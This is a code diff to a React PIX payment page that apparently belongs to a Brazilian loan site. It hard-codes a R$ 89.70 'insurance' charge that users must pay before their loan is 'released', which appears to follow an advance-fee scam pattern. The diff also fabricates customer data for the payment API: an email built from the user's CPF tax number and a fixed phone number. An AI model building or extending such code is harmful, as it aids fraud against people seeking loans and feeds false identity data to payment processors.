@@ -30,7 +30,7 @@ const PIXPayment = () => {
   const { 
     userName,
     userCPF,
-    insuranceAmount = 89.70 // Insurance amount set to 89.70 as per PHP example
+    insuranceAmount = 89.70 // Insurance amount set to 89.70 to match the PHP example
   } = location.state || {
     userName: storedUserName,
     userCPF: storedCPF,
@@ -52,14 +52,18 @@ const PIXPayment = () => {
           description: "Aguarde enquanto geramos seu código de pagamento...",
         });
         
+        // Create customer data object matching the PHP implementation
         const customerData = {
           name: actualUserName,
-          cpf: actualCPF
+          cpf: actualCPF,
+          email: `${actualCPF.replace(/[.-]/g, '')}@gmail.com`,
+          phone: '21965132656'
         };
         
         console.log("Iniciando geração de PIX para:", customerData);
         
-        const pixData = await generatePixPayment(customerData, insuranceAmount);
+        // Call the API with the specific amount from PHP (R$ 89.70)
+        const pixData = await generatePixPayment(customerData, 89.70);
         
         setPixCode(pixData.copiaecola);
         setPixQrCode(pixData.qrcode);
@@ -85,7 +89,7 @@ const PIXPayment = () => {
     };
 
     fetchPixCode();
-  }, [actualUserName, actualCPF, insuranceAmount]);
+  }, [actualUserName, actualCPF]);
 
   // Timer countdown
   useEffect(() => {
@@ -146,7 +150,7 @@ const PIXPayment = () => {
       state: {
         userName: actualUserName,
         userCPF: actualCPF,
-        insuranceAmount,
+        insuranceAmount: 89.70,
         transactionId
       }
     });
@@ -257,7 +261,7 @@ const PIXPayment = () => {
                       <div className="flex items-start">
                         <AlertCircle className="h-5 w-5 text-green-600 mr-2 mt-0.5" />
                         <div>
-                          <p className="text-green-800 font-medium">Valor a pagar: {new Intl.NumberFormat('pt-BR', { style: 'currency', currency: 'BRL' }).format(insuranceAmount)}</p>
+                          <p className="text-green-800 font-medium">Valor a pagar: {new Intl.NumberFormat('pt-BR', { style: 'currency', currency: 'BRL' }).format(89.70)}</p>
                           <p className="text-green-700 text-sm mt-1">
                             Após o pagamento confirmado, seu empréstimo será liberado.
                           </p>
